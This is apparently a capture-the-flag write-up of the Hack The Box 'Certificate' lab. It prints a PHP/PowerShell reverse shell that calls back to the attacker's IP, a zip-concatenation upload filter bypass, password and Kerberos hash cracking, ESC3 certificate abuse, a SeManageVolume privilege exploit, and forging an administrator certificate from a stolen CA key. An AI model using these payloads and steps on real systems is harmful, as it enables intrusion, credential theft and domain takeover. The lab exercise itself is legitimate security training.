# Nmap
```
# Nmap 7.95 scan initiated Mon Jul 21 14:14:51 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -Pn -oN ./nmap.txt 10.10.11.71
Nmap scan report for 10.10.11.71
Host is up (0.38s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-21 12:15:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T12:17:18+00:00; -1h59m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T12:17:17+00:00; -1h59m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
|_ssl-date: 2025-07-21T12:17:18+00:00; -1h59m46s from scanner time.
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-21T12:17:17+00:00; -1h59m46s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-21T12:16:29
|_  start_date: N/A
|_clock-skew: mean: -1h59m47s, deviation: 2s, median: -1h59m46s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jul 21 14:17:08 2025 -- 1 IP address (1 host up) scanned in 137.09 seconds
```

Add `DC01.certificate.htb` and `certificate.htb` to our `/etc/hosts`

# Page check (port 80)
**index page**
![](images/Pasted%20image%2020250721120818.png)

**register page and login page**
![](images/Pasted%20image%2020250721120943.png)
![](images/Pasted%20image%2020250721120959.png)
We can create an account and login to it
Then we can come to course page and enroll the courses
![](images/Pasted%20image%2020250721125754.png)

Scroll to the bottom of the Course Outline and you will see the submit button for the quiz.
![](images/Pasted%20image%2020250721125858.png)

# Upload reverse shell by evil zip
**upload page**
Then we can find a upload api from the submit page
![](images/Pasted%20image%2020250721130232.png)
We can also get the upload path after we upload a test file
![](images/Pasted%20image%2020250721130557.png)
We can also upload a zip file, but it has some WAF to defend the malicious upload
When I wanna to upload a php web shell, it will give us `400 Bad Request`
![](images/Pasted%20image%2020250721131001.png)

If the compressed package directly contains PHP files, it will also be detected, so the compressed package splicing method is adopted here. The decompression tool usually only reads the last valid ZIP directory.
There is blog explaining how to exploit that
`https://www.bleepingcomputer.com/news/security/hackers-now-use-zip-file-concatenation-to-evade-detection/`

Firstly, let's prepare a reverse shell
```
<?php
shell_exec("powershell -nop -w hidden -c \"\$client = New-Object System.Net.Sockets.TCPClient('10.10.14.13',4444); \$stream = \$client.GetStream(); [byte[]]\$bytes = 0..65535|%{0}; while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){; \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i); \$sendback = (iex \$data 2>&1 | Out-String ); \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '; \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2); \$stream.Write(\$sendbyte,0,\$sendbyte.Length); \$stream.Flush()}; \$client.Close()\"");
?>
```

Then we can compress them
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ mkdir malicious      
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ mv shell.php malicious 

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ zip head.zip test.pdf 
  adding: test.pdf (deflated 15%)

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ zip -r tail.zip malicious 
  adding: malicious/ (stored 0%)
  adding: malicious/shell.php (deflated 60%)

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ cat head.zip tail.zip > main.zip

```

Upload the `main.zip` and go the upload path to triggering a reverse shell
```
http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/malicious/shell.php
```

Then you can get the reverse shell 
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.11.71] 64149
whoami
certificate\xamppuser
PS C:\xampp\htdocs\certificate.htb\static\uploads\8ad6b1453a685cd6a629959dcfb5039d\malicious> 

```

# Enumerate the database

After enumerating the file system, I found a `db.php` from `C:\xampp\htdocs\certificate.htb`
```
PS C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>


```
Then we can get the credit of `certificate_webapp_user:cert!f!c@teDBPWD`

Let's interact with `mysql` database `C:\xampp\mysql\bin\mysql.exe`
Since interactive MYSQL has some problems in the rebound shell, a non-interactive way is used here to query
```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "show databases;"
Database
certificate_webapp_db
information_schema
test
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; show tables; select * from users;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG    2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK    2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq    2024-12-23 13:18:18     student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti    2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2    2024-12-24 12:05:05     student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6    2024-12-25 21:31:26     admin   1
12      wither  wither  wither  wither@test.com $2y$04$3pqv03LVuBUJJgvNqItEmOz/YZTWAqc1fLtJvKQR3ze9wZJjHNrl2    2025-07-21 07:10:23     student 1

```

Here we focus on Sara.B, because she exists in the user directory
```
PS C:\Users> dir


    Directory: C:\Users


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
d-----       12/30/2024   8:33 PM                Administrator                                                         
d-----       11/23/2024   6:59 PM                akeder.kh                                                             
d-----        11/4/2024  12:55 AM                Lion.SK                                                               
d-r---        11/3/2024   1:05 AM                Public                                                                
d-----        11/3/2024   7:26 PM                Ryan.K                                                                
d-----       11/26/2024   4:12 PM                Sara.B                                                                
d-----       12/29/2024   5:30 PM                xamppuser 
```

Then let's use john to crack the password of `Sara.B`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ john Sara.hash --wordlist=/usr/share/wordlists/rockyou.txt       
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 16 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Blink182         (?)     
1g 0:00:00:02 DONE (2025-07-21 13:51) 0.3636g/s 4446p/s 4446c/s 4446C/s auntie..8888888888
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
We successfully get the credit `Sara.B:Blink182`

# Crack kerberos from pcap
Firstly, I would like to enumerate all the domain users
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ nxc ldap 10.10.11.71 -u Sara.B -p 'Blink182'
LDAP        10.10.11.71     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
LDAP        10.10.11.71     389    DC01             [+] certificate.htb\Sara.B:Blink182

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ nxc ldap 10.10.11.71 -u Sara.B -p 'Blink182' --users
LDAP        10.10.11.71     389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
LDAP        10.10.11.71     389    DC01             [+] certificate.htb\Sara.B:Blink182 
LDAP        10.10.11.71     389    DC01             [*] Enumerated 18 domain users: certificate.htb
LDAP        10.10.11.71     389    DC01             -Username-                    -Last PW Set-       -BadPW-  -Description-                                               
LDAP        10.10.11.71     389    DC01             Administrator                 2025-04-28 21:33:46 0        Built-in account for administering the computer/domain      
LDAP        10.10.11.71     389    DC01             Guest                         <never>             0        Built-in account for guest access to the computer/domain    
LDAP        10.10.11.71     389    DC01             krbtgt                        2024-11-03 09:24:32 0        Key Distribution Center Service Account                     
LDAP        10.10.11.71     389    DC01             Kai.X                         2024-11-04 00:18:06 1                                                                    
LDAP        10.10.11.71     389    DC01             Sara.B                        2024-11-04 02:01:09 0                                                                    
LDAP        10.10.11.71     389    DC01             John.C                        2024-11-04 02:16:41 1                                                                    
LDAP        10.10.11.71     389    DC01             Aya.W                         2024-11-04 02:17:43 1                                                                    
LDAP        10.10.11.71     389    DC01             Nya.S                         2024-11-04 02:18:53 1                                                                    
LDAP        10.10.11.71     389    DC01             Maya.K                        2024-11-04 02:20:01 1                                                                    
LDAP        10.10.11.71     389    DC01             Lion.SK                       2024-11-04 02:28:02 1                                                                    
LDAP        10.10.11.71     389    DC01             Eva.F                         2024-11-04 02:33:36 1                                                                    
LDAP        10.10.11.71     389    DC01             Ryan.K                        2024-11-04 02:57:30 1                                                                    
LDAP        10.10.11.71     389    DC01             akeder.kh                     2024-11-24 02:26:06 1                                                                    
LDAP        10.10.11.71     389    DC01             kara.m                        2024-11-24 02:28:19 1                                                                    
LDAP        10.10.11.71     389    DC01             Alex.D                        2024-11-24 06:47:44 1                                                                    
LDAP        10.10.11.71     389    DC01             karol.s                       2024-11-24 02:42:21 1                                                                    
LDAP        10.10.11.71     389    DC01             saad.m                        2024-11-24 02:44:23 1                                                                    
LDAP        10.10.11.71     389    DC01             xamppuser                     2024-12-29 09:42:04 0  
```

Then check the `evil-winrm` service
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ nxc winrm 10.10.11.71 -u Sara.B -p 'Blink182'   
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\Sara.B:Blink182 (Pwn3d!)

┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ evil-winrm -i 10.10.11.71 -u Sara.B -p 'Blink182'       
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Sara.B\Documents> 

```

There are two files in the `C:\Users\Sara.B\Documents\WS-01`
```
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> dir


    Directory: C:\Users\Sara.B\Documents\WS-01


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        11/4/2024  12:44 AM            530 Description.txt
-a----        11/4/2024  12:45 AM         296660 WS-01_PktMon.pcap

```
Let's download them to check what information we can gather

**Description.txt**
```
��The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

**WS-01_PktMon.pcap** 
We can use `wireshark` to check it and found `kerberos` related content
![](images/Pasted%20image%2020250721153812.png)
Let's search how to exploit it from google 
![](images/Pasted%20image%2020250721153857.png)
We can use this exploit script to help us find something useful 
`https://github.com/jalvarezz13/Krb5RoastParser`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate/Krb5RoastParser]
└─$ python3 krb5_roast_parser.py ../WS-01_PktMon.pcap as_req >>hash.txt
                                                                                      
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate/Krb5RoastParser]
└─$ cat hash.txt                    
$krb5pa$18$Lion.SK$CERTIFICATE$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0

```
We need to modify the domain name in the hash file 
```
$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

Then we can use `hashcat` to crack that
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate/Krb5RoastParser]
└─$ hashcat hash.txt --show                            
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

19900 | Kerberos 5, etype 18, Pre-Auth | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5pa$18$Lion.SK$CERTIFICATE.HTB$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0:!QAZ2wsx

```

So we successfully get the credit `Lion.SK:!QAZ2wsx`

# Bloodhound by Lion.SK
Also like before we did for `Sara.B`, we can check them of `Lion.SK`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ nxc winrm 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\Lion.SK:!QAZ2wsx (Pwn3d!)
```

We can use `evil-winrm` to get the shell as `Lion.SK`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ evil-winrm -i 10.10.11.71 -u Lion.SK -p '!QAZ2wsx'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Lion.SK\Documents> 

```

We can also Bloodhound this account
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ bloodhound-python -u Lion.SK -p '!QAZ2wsx' -k -d certificate.htb -ns 10.10.11.71 -c ALl --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: certificate.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: dc01.certificate.htb
INFO: Found 19 users
INFO: Found 58 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: WS-05.certificate.htb
INFO: Querying computer: WS-01.certificate.htb
INFO: Querying computer: DC01.certificate.htb
INFO: Done in 01M 37S
INFO: Compressing output into 20250721154853_bloodhound.zip
```
![](images/Pasted%20image%2020250721155230.png)
Group `DOMAIN CRA MANAGERS` seems interesting here, but nothing be linked to that
# ESC3
So I would use `certipy-ad` to help us check some vulnerable cases:
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad find  -u lion.sk -p '!QAZ2wsx' -dc-ip 10.10.11.71 -vulnerable
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Saving text output to '20250721155537_Certipy.txt'
[*] Wrote text output to '20250721155537_Certipy.txt'
[*] Saving JSON output to '20250721155537_Certipy.json'
[*] Wrote JSON output to '20250721155537_Certipy.json'

```
![](images/Pasted%20image%2020250721155609.png)
It gives us the hint to `ESC3` case, let's check how to exploit it step by step
```
https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc3-enrollment-agent-certificate-template
```
Please follow this wiki link to exploit.

**Step 1: Obtain an Enrollment Agent certificate**
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'

Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 21
[*] Successfully requested certificate
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saving certificate and private key to 'lion.sk.pfx'
[*] Wrote certificate and private key to 'lion.sk.pfx'
```

**Step 2: Use the Enrollment Agent certificate to request a certificate on behalf of the target user.**
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad req -u 'lion.sk@CERTIFICATE.HTB' -p '!QAZ2wsx' -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 22
[*] Successfully requested certificate
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saving certificate and private key to 'ryan.k.pfx'
[*] Wrote certificate and private key to 'ryan.k.pfx'
```

**Step 3: Authenticate using the "on-behalf-of" certificate.**
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'ryan.k@certificate.htb'
[*]     Security Extension SID: 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Using principal: 'ryan.k@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'ryan.k.ccache'
[*] Wrote credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6

```

Then we can get the shell as `ryan.k`
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ evil-winrm -i 10.10.11.71 -u ryan.k -H 'b1bc3d70e70f4f36b1509a65ae1a2ae6' 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> 
```

# Privilege Escalation
Then let's check the privileges of `ryan.k`
```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

`SeManageVolumePrivilege` seems like be exploitable
Follow this exploit 
```
https://github.com/CsEnox/SeManageVolumeExploit
```

Let's upload `SeManageVolumeExploit.exe` and run it
We can found All users belonging to the Users group now have Full Control permissions on C:\
```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> .\SeManageVolumeExploit.exe
Entries changed: 844

DONE

*Evil-WinRM* PS C:\Users\Ryan.K\Documents> icacls C:/windows
C:/windows NT SERVICE\TrustedInstaller:(F)
           NT SERVICE\TrustedInstaller:(CI)(IO)(F)
           NT AUTHORITY\SYSTEM:(M)
           NT AUTHORITY\SYSTEM:(OI)(CI)(IO)(F)
           BUILTIN\Users:(M)
           BUILTIN\Users:(OI)(CI)(IO)(F)
           BUILTIN\Pre-Windows 2000 Compatible Access:(RX)
           BUILTIN\Pre-Windows 2000 Compatible Access:(OI)(CI)(IO)(GR,GE)
           CREATOR OWNER:(OI)(CI)(IO)(F)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(RX)
           APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(OI)(CI)(IO)(GR,GE)

Successfully processed 1 files; Failed processing 0 files

```

Then let's export the private key of the certificate, and then download it to the local machine to forge the administrator's certificate
```
*Evil-WinRM* PS C:\Users\Ryan.K\Documents> certutil -exportPFX my "Certificate-LTD-CA" C:\ca.pfx
my "Personal"
================ Certificate 2 ================
Serial Number: 75b2f4bbf31f108945147b466131bdca
Issuer: CN=Certificate-LTD-CA, DC=certificate, DC=htb
 NotBefore: 11/3/2024 3:55 PM
 NotAfter: 11/3/2034 4:05 PM
Subject: CN=Certificate-LTD-CA, DC=certificate, DC=htb
Certificate Template Name (Certificate Type): CA
CA Version: V0.0
Signature matches Public Key
Root Certificate: Subject matches Issuer
Template: CA, Root Certification Authority
Cert Hash(sha1): 2f02901dcff083ed3dbb6cb0a15bbfee6002b1a8
  Key Container = Certificate-LTD-CA
  Unique container name: 26b68cbdfcd6f5e467996e3f3810f3ca_7989b711-2e3f-4107-9aae-fb8df2e3b958
  Provider = Microsoft Software Key Storage Provider
Signature test passed
Enter new password for output file C:\ca.pfx:
Enter new password:
Confirm new password:
CertUtil: -exportPFX command completed successfully.
```

Then use `certipy` to make the fake certificate
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx  
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Saving forged certificate and private key to 'forged_admin.pfx'
[*] Wrote forged certificate and private key to 'forged_admin.pfx'
                                                                                                                                                                                
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ certipy-ad auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@certificate.htb'
[*] Using principal: 'administrator@certificate.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6

```

Then we can get the administrator shell
```
┌──(wither㉿localhost)-[~/Templates/htb-labs/Certificate]
└─$ evil-winrm -i 10.10.11.71 -u administrator -H 'd804304519bf0143c14cbf1c024408c6'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

# Description

I think the most difficult part is the malicious compression used as a foothold. At the beginning, I couldn't imagine it would be like this.

The user and root parts are very regular AD paths, nothing special.